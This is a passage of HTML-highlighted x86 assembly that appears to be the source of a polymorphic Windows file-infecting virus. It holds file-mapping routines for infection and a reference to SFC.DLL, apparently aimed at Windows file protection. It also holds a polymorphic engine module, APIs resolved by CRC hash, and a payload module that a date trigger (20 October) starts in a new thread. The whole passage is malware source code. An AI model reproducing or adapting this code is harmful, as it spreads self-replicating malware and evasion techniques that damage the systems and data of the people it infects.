</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; load mapping handle</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">I_apicall</span><span class="sc0">    </span><span class="sc2">0F8F846CCh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; CloseHandle               </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; load size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; load file handle</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">12</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">I_apicall</span><span class="sc0">    </span><span class="sc2">97E2AF98h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; CreateFileMappingA</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; save the handle</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">000F001Fh</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">I_apicall</span><span class="sc0">    </span><span class="sc2">3D547DB1h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; MapViewOfFile</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; save map handle</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; and neg it</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">wefinished</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc5">getval</span><span class="sc0">          </span><span class="sc10">error</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">             </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc5">fini_m0</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">SFCLib</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SFC.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ISyscall0</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">68h</span><span class="sc0">
</span><span class="sc5">InfectSyscall</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RoutineHandler</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">InfectEnd</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Polymorphic module</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">PolyStart</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PolyEnd</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">PolyStart</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; workable system</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; workable infection</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">PolySyscall</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">PolyStart</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Polyroutine</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">PolyStart</span><span class="sc0">

</span><span class="sc5">PSyscall</span><span class="sc0">    </span><span class="sc9">macro</span><span class="sc0">       </span><span class="sc5">I_ID_CoDE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">I_ID_CoDE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">PSyscall0</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">Polyroutine</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">     
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">714024</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc5">seed</span><span class="sc4">,</span><span class="sc5">poly24</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0CCh</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">poly</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">poly.asm</span><span class="sc0">

</span><span class="sc5">PSyscall0</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">68h</span><span class="sc0">
</span><span class="sc5">PolySyscall</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">PolyEnd</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Cool payload module, well this is a inc file container wich contain the asm</span><span class="sc0">
</span><span class="sc1">; file</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; note that this file contain the Fast api call calling wich is a cache memory</span><span class="sc0">
</span><span class="sc1">; for api call, instead of each time recalculation, it's a pointer to a pointer</span><span class="sc0">
</span><span class="sc1">; to a junk buffer, as a small stack memory is passed to ecx, wich can </span><span class="sc0">
</span><span class="sc1">; accelerate many times api processing, what can be quite interresting for </span><span class="sc0">
</span><span class="sc1">; graphical payload as exemple.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">PayloadStart</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PayloadEnd</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">PayloadStart</span><span class="sc0">    </span><span class="sc1">; module size</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; workable system</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; workable payload version</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">PayloadSyscall</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">PayloadStart</span><span class="sc0">       </span><span class="sc1">; External call</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Payloadroutine</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">PayloadStart</span><span class="sc0">       </span><span class="sc1">; entrypoint relative</span><span class="sc0">


</span><span class="sc5">PSyscall</span><span class="sc0">        </span><span class="sc9">macro</span><span class="sc0">           </span><span class="sc5">I_ID_CoDE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">I_ID_CoDE</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">            </span><span class="sc5">PiSyscall0</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">P_apicall</span><span class="sc0">       </span><span class="sc9">macro</span><span class="sc0">           </span><span class="sc5">crcval</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">libhandle</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">libhandle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">crcval</span><span class="sc0">
                </span><span class="sc5">PSyscall</span><span class="sc0">        </span><span class="sc5">MApiCall</span><span class="sc0">

        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">FP_apicall</span><span class="sc0">      </span><span class="sc9">macro</span><span class="sc0">           </span><span class="sc5">crcval</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">libhandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lpval</span><span class="sc0">

        </span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Papindirected</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&amp;</span><span class="sc5">lpval</span><span class="sc4">&amp;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">libhandle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">crcval</span><span class="sc0">
                </span><span class="sc5">PSyscall</span><span class="sc0">        </span><span class="sc5">FApiCall</span><span class="sc0">

        </span><span class="sc9">endm</span><span class="sc0">


</span><span class="sc5">Payloadroutine</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">P_apicall</span><span class="sc0">   </span><span class="sc2">0B50DB39h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">20</span><span class="sc0">         </span><span class="sc1">; in memory of cecile,</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skippayload</span><span class="sc0">             </span><span class="sc1">; all started 20 octobre...</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skippayload</span><span class="sc0">

</span><span class="sc5">pushfl</span><span class="sc0">      </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">float1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">f2</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">&amp;</span><span class="sc5">f2</span><span class="sc4">&amp;</span><span class="sc5">_getme1</span><span class="sc0">
</span><span class="sc4">&amp;</span><span class="sc5">f2</span><span class="sc4">&amp;</span><span class="sc5">_getme1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+&amp;</span><span class="sc5">f2</span><span class="sc4">&amp;</span><span class="sc5">_load</span><span class="sc4">-&amp;</span><span class="sc5">f2</span><span class="sc4">&amp;</span><span class="sc5">_getme1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">&amp;</span><span class="sc5">f2</span><span class="sc4">&amp;</span><span class="sc5">_end</span><span class="sc0">

</span><span class="sc4">&amp;</span><span class="sc5">f2</span><span class="sc4">&amp;</span><span class="sc5">_load</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc4">&amp;</span><span class="sc5">float1</span><span class="sc4">&amp;</span><span class="sc0">

</span><span class="sc4">&amp;</span><span class="sc5">f2</span><span class="sc4">&amp;</span><span class="sc5">_end</span><span class="sc4">:</span><span class="sc0">   

</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc1">;   int     3</span><span class="sc0">

    </span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">opengldll</span><span class="sc4">,</span><span class="sc5">pp4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc5">PSyscall</span><span class="sc0">    </span><span class="sc5">LoadLib</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finishpayit</span><span class="sc0">

    </span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">gdi32dll</span><span class="sc4">,</span><span class="sc5">pp5</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc5">PSyscall</span><span class="sc0">    </span><span class="sc5">LoadLib</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finishpayit</span><span class="sc0">

    </span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">glu32dll</span><span class="sc4">,</span><span class="sc5">pp6</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
    </span><span class="sc5">PSyscall</span><span class="sc0">    </span><span class="sc5">LoadLib</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finishpayit</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">12</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    
        </span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">InitPayloadThread</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">i22</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc5">P_apicall</span><span class="sc0">   </span><span class="sc2">0CA2C0A90h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Create Thread</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">             </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">finishpayit</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">             </span><span class="sc5">PayCallExit</span><span class="sc0">

</span><span class="sc5">opengldll</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'OPENGL32.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">gdi32dll</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GDI32.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">glu32dll</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GLU32.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Papindirected</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">InitPayloadThread</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">Papindirected</span><span class="sc4">,</span><span class="sc5">ipt</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">repz</span><span class="sc0">        </span><span class="sc6">stosb</span><span class="sc0">       

</span><span class="sc1">;push       10000</span><span class="sc0">
</span><span class="sc1">;P_apicall  3126C0h,0                   ; Sleep</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">P_apicall</span><span class="sc0">       </span><span class="sc2">1017D1A1h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">k</span><span class="sc0">           </span><span class="sc1">; GetModuleHandle</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ALC'</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WindowProc</span><span class="sc4">]</span><span class="sc0">
